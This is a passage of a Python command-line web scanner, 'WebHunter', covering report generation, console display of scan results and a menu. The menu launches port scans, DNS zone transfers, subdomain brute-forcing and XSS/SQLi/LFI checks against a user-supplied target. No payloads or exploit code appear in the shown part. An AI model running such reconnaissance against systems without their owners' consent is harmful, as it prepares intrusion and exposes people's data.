            from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
            from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
            from reportlab.lib import colors
            from reportlab.lib.enums import TA_CENTER, TA_LEFT
            from reportlab.lib.units import inch

            doc = SimpleDocTemplate(filename, pagesize=A4, rightMargin=72, leftMargin=72, topMargin=72, bottomMargin=18)
            styles = getSampleStyleSheet()
            story = []

            # عنوان التقرير
            title_style = ParagraphStyle(
                name='TitleStyle',
                parent=styles['Heading1'],
                fontSize=24,
                spaceAfter=30,
                alignment=TA_CENTER,
                textColor=colors.darkblue
            )
            story.append(Paragraph(f"WebHunter Security Report for {self.target_domain}", title_style))
            story.append(Spacer(1, 12))

            # معلومات أساسية
            story.append(Paragraph(f"<b>Target:</b> {self.target_url}", styles['Normal']))
            story.append(Paragraph(f"<b>Scan Date:</b> {self.results['timestamp']}", styles['Normal']))
            story.append(Spacer(1, 12))

            # ملخص الثغرات
            high_vulns = len(self.results['vulnerabilities']['high'])
            medium_vulns = len(self.results['vulnerabilities']['medium'])
            low_vulns = len(self.results['vulnerabilities']['low'])

            story.append(Paragraph("Vulnerability Summary", styles['Heading2']))

            summary_data = [['Severity', 'Count'],
                           ['High', str(high_vulns)],
                           ['Medium', str(medium_vulns)],
                           ['Low', str(low_vulns)],
                           ['Total', str(high_vulns + medium_vulns + low_vulns)]]

            summary_table = Table(summary_data)
            summary_table.setStyle(TableStyle([
                ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
                ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
                ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                ('FONTSIZE', (0, 0), (-1, 0), 14),
                ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
                ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
                ('GRID', (0, 0), (-1, -1), 1, colors.black)
            ]))
            story.append(summary_table)
            story.append(Spacer(1, 12))

            # معلومات عامة
            story.append(Paragraph("General Information", styles['Heading2']))
            info_data = [['Key', 'Value']]
            info_data.append(['IP Address', self.results['info'].get('ip', 'N/A')])
            info_data.append(['HTTP Status', str(self.results['info'].get('http_status', 'N/A'))])
            info_data.append(['Title', self.results['info'].get('title', 'N/A')])
            info_data.append(['Server', self.results['info'].get('server', 'N/A')])
            info_data.append(['Powered By', self.results['info'].get('powered_by', 'N/A')])

            info_table = Table(info_data)
            info_table.setStyle(TableStyle([
                ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
                ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
                ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                ('FONTSIZE', (0, 0), (-1, 0), 14),
                ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
                ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
                ('GRID', (0, 0), (-1, -1), 1, colors.black)
            ]))
            story.append(info_table)
            story.append(Spacer(1, 12))

            # التقنيات المكتشفة
            story.append(Paragraph("Detected Technologies", styles['Heading2']))
            tech_text = ", ".join(self.results['technologies']) if self.results['technologies'] else "No technologies detected."
            story.append(Paragraph(tech_text, styles['Normal']))
            story.append(Spacer(1, 12))

            # الثغرات عالية الخطورة
            if high_vulns > 0:
                story.append(Paragraph("High Severity Vulnerabilities", styles['Heading2']))
                for vuln in self.results['vulnerabilities']['high']:
                    story.append(Paragraph(f"<b>Type:</b> {vuln.get('type', 'N/A')}", styles['Normal']))
                    story.append(Paragraph(f"<b>URL:</b> {vuln.get('url', 'N/A')}", styles['Normal']))
                    story.append(Paragraph(f"<b>Method:</b> {vuln.get('method', 'N/A')}", styles['Normal']))
                    story.append(Paragraph(f"<b>Payload:</b> {vuln.get('payload', 'N/A')}", styles['Normal']))
                    story.append(Paragraph(f"<b>Evidence:</b> {vuln.get('evidence', 'N/A')}", styles['Normal']))
                    story.append(Spacer(1, 6))

            doc.build(story)
        except ImportError:
            self.console.print("[red][-][/red] Cannot generate PDF report. ReportLab library is not installed.")
            self.console.print("[yellow][*][/yellow] Installing reportlab: pip install reportlab")
            # إنشاء تقرير HTML كبديل
            self._generate_html_report(filename.replace('.pdf', '.html'))

    def save_scan_to_db(self):
        """حفظ نتائج الفحص في قاعدة البيانات"""
        self.console.print(f"[bold cyan][+][/bold cyan] Saving scan results to database...")
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute("INSERT INTO scans (target, results) VALUES (?, ?)", (self.target_url, json.dumps(self.results, default=str)))
        conn.commit()
        conn.close()
        self.console.print(f"[green][+][/green] Scan results saved.")

    def display_results(self):
        """عرض نتائج الفحص"""
        self.console.print(Panel.fit(f"[bold green]Scan Complete for {self.target_url}[/bold green]"))

        # معلومات أساسية
        info_table = Table(title="General Information")
        info_table.add_column("Key", style="cyan", no_wrap=True)
        info_table.add_column("Value", style="magenta")
        info_table.add_row("IP Address", self.results['info'].get('ip', 'N/A'))
        info_table.add_row("HTTP Status", str(self.results['info'].get('http_status', 'N/A')))
        info_table.add_row("Title", self.results['info'].get('title', 'N/A'))
        info_table.add_row("Server", self.results['info'].get('server', 'N/A'))
        info_table.add_row("Powered By", self.results['info'].get('powered_by', 'N/A'))
        self.console.print(info_table)

        # التقنيات المكتشفة
        tech_table = Table(title="Detected Technologies")
        tech_table.add_column("Technology", style="green")
        for tech in self.results['technologies']:
            tech_table.add_row(tech)
        self.console.print(tech_table)

        # النطاقات الفرعية
        sub_table = Table(title="Subdomains Found")
        sub_table.add_column("Subdomain", style="blue")
        for sub in self.results['subdomains']:
            sub_table.add_row(sub)
        self.console.print(sub_table)

        # المنافذ المفتوحة
        port_table = Table(title="Open Ports")
        port_table.add_column("Port", style="red")
        port_table.add_column("Service", style="yellow")
        for port, service in self.results['open_ports'].items():
            port_table.add_row(str(port), service)
        self.console.print(port_table)

        # الروابط المكتشفة - عرض جميع الروابط
        if self.results['crawl_data']['urls']:
            # استخدام Tree لعرض الروابط بشكل منظم
            urls_tree = Tree(f"Discovered URLs ({len(self.results['crawl_data']['urls'])} total)")
            
            # تجميع الروابط حسب المسار
            url_paths = defaultdict(list)
            for url in self.results['crawl_data']['urls']:
                parsed = urlparse(url)
                path = parsed.path
                if path == '' or path == '/':
                    path = '/ (Root)'
                elif '/' in path[1:]:
                    # استخراج المسار الرئيسي
                    main_path = '/' + path.split('/')[1]
                    path = main_path
                url_paths[path].append(url)
            
            # إضافة المسارات والروابط إلى الشجرة
            for path, urls in sorted(url_paths.items()):
                path_node = urls_tree.add(f"[bold cyan]{path}[/bold cyan] ({len(urls)} URLs)")
                
                # عرض أول 5 روابط لكل مسار
                for url in urls[:5]:
                    path_node.add(url)
                
                # إذا كان هناك أكثر من 5 روابط، أضف رسالة تشير إلى العدد الإجمالي
                if len(urls) > 5:
                    path_node.add(f"[dim]... and {len(urls) - 5} more URLs[/dim]")
            
            self.console.print(urls_tree)
            
            # إضافة خيار لحفظ جميع الروابط في ملف
            if Confirm.ask("Do you want to save all discovered URLs to a file?"):
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"urls_{self.base_domain}_{timestamp}.txt"
                with open(filename, 'w') as f:
                    for url in self.results['crawl_data']['urls']:
                        f.write(url + '\n')
                self.console.print(f"[green][+][/green] All URLs saved to {filename}")

        # عناوين البريد الإلكتروني
        if self.results['crawl_data']['emails']:
            emails_table = Table(title="Discovered Emails")
            emails_table.add_column("Email", style="magenta")
            for email in self.results['crawl_data']['emails']:
                emails_table.add_row(email)
            self.console.print(emails_table)

        # الثغرات
        vuln_table = Table(title="Vulnerabilities Found")
        vuln_table.add_column("Severity", style="bold")
        vuln_table.add_column("Type", style="cyan")
        vuln_table.add_column("URL", style="magenta")

        for vuln in self.results['vulnerabilities']['high']:
            vuln_table.add_row("[red]High[/red]", vuln['type'], vuln['url'])
        for vuln in self.results['vulnerabilities']['medium']:
            vuln_table.add_row("[yellow]Medium[/yellow]", vuln['type'], vuln['url'])
        for vuln in self.results['vulnerabilities']['low']:
            vuln_table.add_row("[blue]Low[/blue]", vuln['type'], vuln['url'])
        self.console.print(vuln_table)

        # صفحات تسجيل الدخول
        if self.results['login_pages']:
            login_table = Table(title="Login Pages Found")
            login_table.add_column("URL", style="cyan")
            login_table.add_column("Form Action", style="magenta")
            login_table.add_column("Method", style="yellow")
            for login in self.results['login_pages']:
                login_table.add_row(login['url'], login['form_action'], login['method'])
            self.console.print(login_table)

        # الملفات الحساسة
        if self.results['sensitive_files']:
            files_table = Table(title="Sensitive Files Found")
            files_table.add_column("URL", style="cyan")
            files_table.add_column("Type", style="magenta")
            files_table.add_column("Size", style="yellow")
            for file in self.results['sensitive_files']:
                files_table.add_row(file['url'], file['type'], str(file.get('size', 'N/A')))
            self.console.print(files_table)

        # تحليل SEO
        if 'performance' in self.results['seo']:
            seo_table = Table(title="SEO & Performance Analysis")
            seo_table.add_column("Metric", style="cyan")
            seo_table.add_column("Value", style="magenta")
            seo_table.add_row("Load Time", self.results['seo']['performance'].get('load_time', 'N/A'))
            seo_table.add_row("Page Size", self.results['seo']['performance'].get('size', 'N/A'))
            seo_table.add_row("Title Length", str(self.results['seo']['seo'].get('title_length', 0)))
            seo_table.add_row("Meta Description Length", str(self.results['seo']['seo'].get('meta_description_length', 0)))
            seo_table.add_row("H1 Tags Count", str(self.results['seo']['seo'].get('h1_tags_count', 0)))
            seo_table.add_row("Internal Links", str(self.results['seo']['seo'].get('internal_links', 0)))
            seo_table.add_row("External Links", str(self.results['seo']['seo'].get('external_links', 0)))
            seo_table.add_row("Uses HTTPS", "Yes" if self.results['seo']['best_practices'].get('uses_https', False) else "No")
            self.console.print(seo_table)
            
        # عرض معلومات WHOIS بشكل مفصل
        if self.results['whois'] and 'error' not in self.results['whois']:
            whois_table = Table(title="WHOIS Information")
            whois_table.add_column("Field", style="cyan")
            whois_table.add_column("Value", style="magenta")
            
            # معلومات التسجيل
            whois_table.add_row("Domain Name", str(self.results['whois'].get('domain_name', 'N/A')))
            whois_table.add_row("Registrar", str(self.results['whois'].get('registrar', 'N/A')))
            whois_table.add_row("WHOIS Server", str(self.results['whois'].get('whois_server', 'N/A')))
            whois_table.add_row("Referral URL", str(self.results['whois'].get('referral_url', 'N/A')))
            
            # التواريخ
            whois_table.add_row("Creation Date", str(self.results['whois'].get('creation_date', 'N/A')))
            whois_table.add_row("Updated Date", str(self.results['whois'].get('updated_date', 'N/A')))
            whois_table.add_row("Expiration Date", str(self.results['whois'].get('expiration_date', 'N/A')))
            
            # عمر النطاق
            if 'domain_age_days' in self.results['whois']:
                whois_table.add_row("Domain Age", f"{self.results['whois'].get('domain_age_days', 'N/A')} days ({self.results['whois'].get('domain_age_years', 'N/A')} years)")
            
            # أيام حتى انتهاء الصلاحية
            if 'days_until_expiry' in self.results['whois']:
                whois_table.add_row("Days Until Expiry", str(self.results['whois'].get('days_until_expiry', 'N/A')))
            
            # معلومات المالك
            whois_table.add_row("Registrant Name", str(self.results['whois'].get('name', 'N/A')))
            whois_table.add_row("Organization", str(self.results['whois'].get('org', 'N/A')))
            whois_table.add_row("Address", str(self.results['whois'].get('address', 'N/A')))
            whois_table.add_row("City", str(self.results['whois'].get('city', 'N/A')))
            whois_table.add_row("State", str(self.results['whois'].get('state', 'N/A')))
            whois_table.add_row("Country", str(self.results['whois'].get('country', 'N/A')))
            
            # معلومات الاتصال
            emails = self.results['whois'].get('email', [])
            if emails:
                if isinstance(emails, list):
                    whois_table.add_row("Email", ', '.join(str(e) for e in emails))
                else:
                    whois_table.add_row("Email", str(emails))
            
            whois_table.add_row("Phone", str(self.results['whois'].get('phone', 'N/A')))
            whois_table.add_row("Fax", str(self.results['whois'].get('fax', 'N/A')))
            
            # خوادم الأسماء
            name_servers = self.results['whois'].get('name_servers', [])
            if name_servers:
                if isinstance(name_servers, list):
                    whois_table.add_row("Name Servers", ', '.join(str(ns) for ns in name_servers))
                else:
                    whois_table.add_row("Name Servers", str(name_servers))
            
            # حالة النطاق
            status = self.results['whois'].get('status', [])
            if status:
                if isinstance(status, list):
                    whois_table.add_row("Status", ', '.join(str(s) for s in status))
                else:
                    whois_table.add_row("Status", str(status))
            
            # DNSSEC
            whois_table.add_row("DNSSEC", str(self.results['whois'].get('dnssec', 'N/A')))
            
            self.console.print(whois_table)
            
            # إضافة خيار لحفظ معلومات WHOIS في ملف
            if Confirm.ask("Do you want to save WHOIS information to a file?"):
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"whois_{self.base_domain}_{timestamp}.txt"
                with open(filename, 'w') as f:
                    for key, value in self.results['whois'].items():
                        if value:
                            if isinstance(value, list):
                                value = ', '.join(str(v) for v in value)
                            f.write(f"{key}: {value}\n")
                self.console.print(f"[green][+][/green] WHOIS information saved to {filename}")

def main():
    """الدالة الرئيسية"""
    console = Console()

    # مسح الشاشة وعرض الشعار
    clear_screen()
    console.print(r"""
 ___       __    ______ ______  __             _____
__ |     / /_______  /____  / / /___  __________  /_____________
__ | /| / /_  _ \_  __ \_  /_/ /_  / / /_  __ \  __/  _ \_  ___/
__ |/ |/ / /  __/  /_/ /  __  / / /_/ /_  / / / /_ /  __/  /
____/|__/  \___//_.___//_/ /_/  \__,_/ /_/ /_/\__/ \___//_/

    """, style="bold red")

    setup_database()

    while True:
        console.print("\n[bold cyan]Main Menu[/bold cyan]")
        choice = Prompt.ask("Choose an option", choices=["scan", "view_db", "exit"], default="scan")

        if choice == "exit":
            console.print("[bold red]Exiting...[/bold red]")
            break

        if choice == "view_db":
            conn = sqlite3.connect(DB_FILE)
            cursor = conn.cursor()
            cursor.execute("SELECT id, target, timestamp FROM scans ORDER BY timestamp DESC")
            scans = cursor.fetchall()
            conn.close()

            if not scans:
                console.print("[yellow]No previous scans found in the database.[/yellow]")
                continue

            db_table = Table(title="Previous Scans")
            db_table.add_column("ID", style="cyan")
            db_table.add_column("Target", style="magenta")
            db_table.add_column("Timestamp", style="green")
            for scan_id, target, timestamp in scans:
                db_table.add_row(str(scan_id), target, timestamp)
            console.print(db_table)

            try:
                scan_id_to_view = int(Prompt.ask("Enter the ID of the scan to view details (or 0 to go back)"))
                if scan_id_to_view == 0:
                    continue

                conn = sqlite3.connect(DB_FILE)
                cursor = conn.cursor()
                cursor.execute("SELECT results FROM scans WHERE id = ?", (scan_id_to_view,))
                result = cursor.fetchone()
                conn.close()

                if result:
                    results = json.loads(result[0])
                    console.print(Panel.fit(f"[bold green]Results for {results['target']}[/bold green]"))
                    # عرض ملخص النتائج
                    console.print(f"[bold]Target:[/bold] {results['target']}")
                    console.print(f"[bold]IP:[/bold] {results['info'].get('ip', 'N/A')}")
                    console.print(f"[bold]Technologies:[/bold] {', '.join(results['technologies'])}")
                    console.print(f"[bold]Subdomains:[/bold] {len(results['subdomains'])}")
                    console.print(f"[bold]Open Ports:[/bold] {len(results['open_ports'])}")
                    console.print(f"[bold]High Vulnerabilities:[/bold] {len(results['vulnerabilities']['high'])}")
                    console.print(f"[bold]Medium Vulnerabilities:[/bold] {len(results['vulnerabilities']['medium'])}")
                    console.print(f"[bold]Low Vulnerabilities:[/bold] {len(results['vulnerabilities']['low'])}")
                else:
                    console.print(f"[red]Scan with ID {scan_id_to_view} not found.[/red]")
            except ValueError:
                console.print("[red]Invalid input. Please enter a number.[/red]")
            continue

        target_url = Prompt.ask("Enter the target URL (e.g., http://example.com)")
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'https://' + target_url

        hunter = WebHunter(target_url, console)

        console.print("\n[bold cyan]Scan Options[/bold cyan]")
        console.print("1. Full Scan (All modules)")
        console.print("2. Information Gathering (Info, DNS, WHOIS, SSL, Tech)")
        console.print("3. Subdomain Enumeration")
        console.print("4. Port Scanning")
        console.print("5. Web Crawling")
        console.print("6. Vulnerability Scanning (XSS, SQLi, LFI, Directory Traversal)")
        console.print("7. SEO & Performance Analysis")
        console.print("8. Sensitive Files Detection")
        console.print("9. DNS Analysis (including reverse DNS and zone transfer)")
        console.print("10. Advanced Subdomain Enumeration (Multiple Methods)")

        scan_choice = Prompt.ask("Choose a scan type", choices=["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default="1")

        try:
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                TimeElapsedColumn(),
                console=console,
            ) as progress:

                if scan_choice == "1":
                    task = progress.add_task("[cyan]Scanning target...", total=100)

                    progress.update(task, advance=10)
                    hunter.gather_info()

                    progress.update(task, advance=10)
                    hunter.analyze_dns()

                    progress.update(task, advance=5)
                    hunter.reverse_dns_lookup()

                    progress.update(task, advance=5)
                    hunter.dns_zone_transfer()

                    progress.update(task, advance=10)
                    hunter.analyze_whois()

                    progress.update(task, advance=10)
                    hunter.analyze_ssl()

                    progress.update(task, advance=10)
                    hunter.detect_technologies()

                    progress.update(task, advance=10)
                    hunter.find_subdomains_bruteforce()

                    progress.update(task, advance=10)
                    hunter.scan_ports()

                    progress.update(task, advance=10)
                    hunter.crawl_site()

                    progress.update(task, advance=5)
                    hunter.analyze_robots_txt()

                    progress.update(task, advance=5)
                    hunter.analyze_sitemap_xml()

                    progress.update(task, advance=5)
                    hunter.find_login_pages()

                    progress.update(task, advance=5)
                    hunter.scan_csrf_tokens()

                    progress.update(task, advance=5)
                    hunter.find_sensitive_files()

                    progress.update(task, advance=5)
                    hunter.scan_vulnerabilities()

                    progress.update(task, advance=5)
                    hunter.analyze_seo_performance()

                elif scan_choice == "2":
                    task = progress.add_task("[cyan]Gathering information...", total=100)

                    progress.update(task, advance=20)
                    hunter.gather_info()

                    progress.update(task, advance=20)
                    hunter.analyze_dns()

                    progress.update(task, advance=10)
                    hunter.reverse_dns_lookup()

                    progress.update(task, advance=10)
                    hunter.dns_zone_transfer()

                    progress.update(task, advance=20)
                    hunter.analyze_whois()

                    progress.update(task, advance=20)
                    hunter.analyze_ssl()

                    progress.update(task, advance=20)
                    hunter.detect_technologies()

                elif scan_choice == "3":
                    task = progress.add_task("[cyan]Enumerating subdomains...", total=100)
                    progress.update(task, advance=50)
                    hunter.find_subdomains_bruteforce()
                    progress.update(task, advance=50)

                elif scan_choice == "4":
                    task = progress.add_task("[cyan]Scanning ports...", total=100)
                    progress.update(task, advance=50)
                    hunter.gather_info()
                    progress.update(task, advance=50)
                    hunter.scan_ports()

                elif scan_choice == "5":
                    task = progress.add_task("[cyan]Crawling website...", total=100)
                    progress.update(task, advance=100)
                    hunter.crawl_site()

                elif scan_choice == "6":
                    task = progress.add_task("[cyan]Scanning for vulnerabilities...", total=100)
                    progress.update(task, advance=30)
                    hunter.crawl_site()

                    progress.update(task, advance=30)
                    hunter.find_login_pages()

                    progress.update(task, advance=20)
                    hunter.scan_csrf_tokens()

                    progress.update(task, advance=20)
                    hunter.scan_vulnerabilities()

                elif scan_choice == "7":
                    task = progress.add_task("[cyan]Analyzing SEO and performance...", total=100)
                    progress.update(task, advance=100)
                    hunter.analyze_seo_performance()

                elif scan_choice == "8":
                    task = progress.add_task("[cyan]Detecting sensitive files...", total=100)
                    progress.update(task, advance=50)
                    hunter.crawl_site()

                    progress.update(task, advance=50)
                    hunter.find_sensitive_files()

                elif scan_choice == "9":
                    task = progress.add_task("[cyan]Analyzing DNS...", total=100)
                    progress.update(task, advance=30)
                    hunter.analyze_dns()

                    progress.update(task, advance=30)
                    hunter.reverse_dns_lookup()

                    progress.update(task, advance=40)
                    hunter.dns_zone_transfer()
                    
                elif scan_choice == "10":
                    task = progress.add_task("[cyan]Advanced subdomain enumeration...", total=100)
                    
                    progress.update(task, advance=25)
                    hunter.find_subdomains_bruteforce()
                    
                    progress.update(task, advance=25)
                    hunter.find_subdomains_certificate_transparency()
                    
                    progress.update(task, advance=25)
                    hunter.find_subdomains_dns_enum()
                    
                    progress.update(task, advance=25)
                    hunter.find_subdomains_search_engines()

            hunter.display_results()

            if Confirm.ask("Do you want to save the results to the database?"):
                hunter.save_scan_to_db()

            if Confirm.ask("Do you want to generate a report?"):
                report_format = Prompt.ask("Choose format (html, pdf, json)", choices=["html", "pdf", "json"], default="html")
                hunter.generate_report(report_format)

        except KeyboardInterrupt:
            console.print("\n[bold red]Scan interrupted by user.[/bold red]")
        except Exception as e:
            console.print(f"\n[bold red]An unexpected error occurred: {e}[/bold red]")

if __name__ == "__main__":
    main()
